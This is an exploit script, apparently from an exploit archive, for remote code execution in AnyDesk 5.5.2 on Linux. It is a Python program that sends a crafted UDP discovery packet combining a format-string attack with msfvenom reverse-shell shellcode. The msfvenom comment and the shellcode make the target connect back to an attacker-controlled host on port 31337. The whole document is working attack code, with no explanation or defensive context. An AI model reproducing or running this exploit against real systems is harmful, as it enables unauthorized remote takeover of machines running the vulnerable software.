# Exploit Title: AnyDesk 5.5.2 - Remote Code Execution
# Date: 09/06/20
# Exploit Author: scryh
# Vendor Homepage: https://anydesk.com/en
# Version: 5.5.2
# Tested on: Linux
# Walkthrough: https://devel0pment.de/?p=1881

#!/usr/bin/python3
import struct
import socket
import sys

ip = '10.10.164.14'
port = 50001

def gen_discover_packet(ad_id, os, hn, user, inf, func):
  d  = chr(0x3e)+chr(0xd1)+chr(0x1)
  d += struct.pack('>I', ad_id)
  d += struct.pack('>I', 0)
  d += chr(0x2)+chr(os)
  d += struct.pack('>I', len(hn)) + hn
  d += struct.pack('>I', len(user)) + user
  d += struct.pack('>I', 0)
  d += struct.pack('>I', len(inf)) + inf
  d += chr(0)
  d += struct.pack('>I', len(func)) + func
  d += chr(0x2)+chr(0xc3)+chr(0x51)
  return d


# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.11.3.193 LPORT=31337 -b "\x00\x25\x26" -f python -v shellcode
shellcode =  b""
shellcode += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48"
shellcode += b"\x8d\x05\xef\xff\xff\xff\x48\xbb\xea\x01\x62"
shellcode += b"\x71\xe3\xf2\xc2\x5e\x48\x31\x58\x27\x48\x2d"
shellcode += b"\xf8\xff\xff\xff\xe2\xf4\x80\x28\x3a\xe8\x89"
shellcode += b"\xf0\x9d\x34\xeb\x5f\x6d\x74\xab\x65\x8a\xe7"
shellcode += b"\xe8\x01\x18\x18\xe9\xf9\xc1\x9f\xbb\x49\xeb"
shellcode += b"\x97\x89\xe2\x98\x34\xc0\x59\x6d\x74\x89\xf1"
shellcode += b"\x9c\x16\x15\xcf\x08\x50\xbb\xfd\xc7\x2b\x1c"
shellcode += b"\x6b\x59\x29\x7a\xba\x79\x71\x88\x68\x0c\x5e"
shellcode += b"\x90\x9a\xc2\x0d\xa2\x88\x85\x23\xb4\xba\x4b"
shellcode += b"\xb8\xe5\x04\x62\x71\xe3\xf2\xc2\x5e"


print('sending payload ...')
concat_shellcode = b'\x85\xfe%1$*1$x%18x%165$ln' + shellcode
p = gen_discover_packet(4919, 1, concat_shellcode, '\x85\xfe%18472249x%93$ln', 'ad', 'main')
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(p, (ip, port))
s.close()
print('reverse shell should connect within 5 seconds')
